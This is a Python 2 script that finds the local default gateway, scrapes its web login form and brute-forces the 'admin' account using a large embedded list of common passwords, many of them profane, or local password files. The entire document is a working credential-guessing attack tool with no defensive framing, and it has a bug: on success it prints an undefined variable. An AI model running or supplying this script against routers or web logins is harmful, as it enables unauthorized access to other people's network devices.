#! /usr/bin/python
import base64
import urllib
import urllib2
import httplib
import sys
import re
import time
import os
import netinfo
from bs4 import BeautifulSoup

#Submit a form, and return true if the http answer is valid
def submitForm(login, password, url, formInfo):
	values = {
			formInfo['login'] : login,
			formInfo['passwd'] : password
			}
	data = urllib.urlencode(values)
	headers = {'User-Agent' : 'Mozilla 5.10'}
	req = urllib2.Request('http://' + url + formInfo['action'], data, headers)
	response = urllib2.urlopen(req)
	html = response.read()
	response.close()
	soup = BeautifulSoup( html ) 
	return True if ( soup.title != formInfo['title'] ) else False

#find all the file who match ^passwd in the box.py dir
def findPasswdFiles():
	APP_PATH = os.path.dirname(os.path.realpath(__file__))
	files = []
	for fileInDir in os.listdir(APP_PATH):
		if(re.match('^passwd', fileInDir)):
			files.append(fileInDir)
	return files

#Return an Embedded list of most common passwords (source : http://wiki.skullsecurity.org/Passwords)
def getEmbeddedPasswordList():
	return ['123456','password','12345678','1234','pussy','12345','dragon','qwerty','696969','mustang','letmein','baseball','master','michael','football','shadow','monkey','abc123','pass','fuckme','6969','jordan','harley','ranger','iwantu','jennifer','hunter','fuck','2000','test','batman','trustno1','thomas','tigger','robert','access','love','buster','1234567','soccer','hockey','killer','george','sexy','andrew','charlie','superman','asshole','fuckyou','dallas','jessica','panties','pepper','1111','austin','william','daniel','golfer','summer','heather','hammer','yankees','joshua','maggie','biteme','enter','ashley','thunder','cowboy','silver','richard','fucker','orange','merlin','michelle','corvette','bigdog','cheese','matthew','121212','patrick','martin','freedom','ginger','blowjob','nicole','sparky','yellow','camaro','secret','dick','falcon','taylor','111111','131313','123123','bitch','hello','scooter','please','porsche','guitar','chelsea','black','diamond','nascar','jackson','cameron','654321','computer','amanda','wizard','xxxxxxxx','money','phoenix','mickey','bailey','knight','iceman','tigers','purple','andrea','horny','dakota','aaaaaa','player','sunshine','morgan','starwars','boomer','cowboys','edward','charles','girls','booboo','coffee','xxxxxx','bulldog','ncc1701','rabbit','peanut','john','johnny','gandalf','spanky','winter','brandy','compaq','carlos','tennis','james','mike','brandon','fender','anthony','blowme','ferrari','cookie','chicken','maverick','chicago','joseph','diablo','sexsex','hardcore','666666','willie','welcome','chris','panther','yamaha','justin','banana','driver','marine','angels','fishing','david','maddog','hooters','wilson','butthead','dennis','fucking','captain','bigdick','chester','smokey','xavier','steven','viking','snoopy','blue','eagles','winner','samantha','house','miller','flower','jack','firebird','butter','united','turtle','steelers','tiffany','zxcvbn','tomcat','golf','bond007','bear','tiger','doctor','gateway','gators','angel','junior','thx1138','porno','badboy','debbie','spider','melissa','booger','1212','flyers','fish','porn','matrix','teens','scooby','jason','walter','cumshot','boston','braves','yankee','lover','barney','victor','tucker','princess','mercedes','5150','doggie','zzzzzz','gunner','horney','bubba','2112','fred','johnson','xxxxx','tits','member','boobs','donald','bigdaddy','bronco','penis','voyager','rangers','birdie','trouble','white','topgun','bigtits','bitches','green','super','qazwsx','magic','lakers','rachel','slayer','scott','2222','asdf','video','london','7777','marlboro','srinivas','internet','action','carter','jasper','monster','teresa','jeremy','11111111','bill','crystal','peter','pussies','cock','beer','rocket','theman','oliver','prince','beach','amateur','7777777','muffin','redsox','star','testing','shannon','murphy','frank','hannah','dave','eagle1','11111','mother','nathan','raiders','steve','forever','angela','viper','ou812','jake','lovers','suckit','gregory','buddy','whatever','young','nicholas','lucky','helpme','jackie','monica','midnight','college','baby','cunt','brian','mark','startrek','sierra','leather','232323','4444','beavis','bigcock','happy','sophie','ladies','naughty','giants','booty','blonde','fucked','golden','0','fire','sandra','pookie','packers','einstein','dolphins','0','chevy','winston','warrior','sammy','slut','8675309','zxcvbnm','nipples','power','victoria','asdfgh','vagina','toyota','travis','hotdog','paris','rock','xxxx','extreme','redskins','erotic','dirty','ford','freddy','arsenal','access14','wolf','nipple','iloveyou','alex','florida','eric','legend','movie','success','rosebud','jaguar','great','cool','cooper','1313','scorpio','mountain','madison','987654','brazil','lauren','japan','naked','squirt','stars','apple','alexis','aaaa','bonnie','peaches','jasmine','kevin','matt','qwertyui','danielle','beaver','4321','4128','runner','swimming','dolphin','gordon','casper','stupid','shit','saturn','gemini','apples','august','3333','canada','blazer','cumming','hunting','kitty','rainbow','112233','arthur','cream','calvin','shaved','surfer','samson','kelly','paul','mine','king','racing','5555','eagle','hentai','newyork','little','redwings','smith','sticky','cocacola','animal','broncos','private','skippy','marvin','blondes','enjoy','girl','apollo','parker','qwert','time','sydney','women','voodoo','magnum','juice','abgrtyu','777777','dreams','maxwell','music','rush2112','russia','scorpion','rebecca','tester','mistress','phantom','billy','6666','albert']

#Return list of passwords
def getPasswordList():
	files = findPasswdFiles()
	if(len(files) == 0):
		print 'WARNING ! No password files detected ! Will use the embedded password list \n'
		return getEmbeddedPasswordList()
	else:
		print 'Please choose a file :'
		print '\t0)Embedded list'
		i=1
		for f in files:
			print '\t' + str(i) + ')' + f
			i += 1

		isCorrect = False
		answer = -1
		while(not isCorrect):
			answer = raw_input('selection ?')
			if(re.match('\d+', answer) and int(answer) >= 0 and int(answer) <= len(files)):
				isCorrect = True
		answer = int(answer)
		if(answer == 0):
			return getEmbeddedPasswordList()
		elif(answer > 0 and answer <= len(files)):
			filePasswd = open(files[answer - 1], 'r')
			passwords = []
			for l in filePasswd:
				passwords.append(l)
			return passwords
		else:
			print 'Something went wrong, exiting now....'
			sys.exit(1)

#Found the default gateway in all network interfaces
def getDefaultGateway():
	osName = os.uname()[0]
	if(re.match('^linux$', osName, re.IGNORECASE)):
		for interface in netinfo.get_routes():
			if(not re.match('^0\.0\.0\.0$',interface['gateway'])):
				print 'Found a correct gateway : ' + interface['gateway']
				return interface['gateway']
	else:
		print 'Warning gateway detection not yet implemented on your os...will try 192.168.0.1'
		return '192.168.0.1'

#Return an array with informations about the form
def getTargetFormInfo(url):
	answer = {}
	response = urllib2.urlopen('http://' + url)
	soup = BeautifulSoup( response.read() )
	answer['title'] = soup.title
	for form in soup.find_all('form'):
		answer['action'] = form['action']

		for inputField in form.find_all('input'):
			if(re.match('text',inputField['type'], re.IGNORECASE) and re.match('.*(name|login|user).*', inputField['name'], re.IGNORECASE)):
				answer['login'] = inputField['name']
			elif(re.match('password',inputField['type'], re.IGNORECASE) and re.match('.*passw?.*', inputField['name'], re.IGNORECASE)):
				answer['passwd'] = inputField['name']

	return answer

encodeBase64 = False
login = 'admin'

if(encodeBase64):
	login = base64.b64encode(login)

passwords = getPasswordList()
url = getDefaultGateway()
formInfo = getTargetFormInfo(url)

print 'Scanning list of passwords.'
i = 0
total = len(passwords)
for l in passwords:
	password = re.sub(r'[^\w]', '', l)
	print('Total : ' + str(i) + '/' + str(total) + '       \r'),
	sys.stdout.flush()
	if(encodeBase64):
		password = base64.b64encode(password)
	result = submitForm(login, password, url, formInfo)
	if result:
		print passwordClean
		sys.exit(0)
	time.sleep(0.01)
	i += 1
print 'couldn\'t find any match !'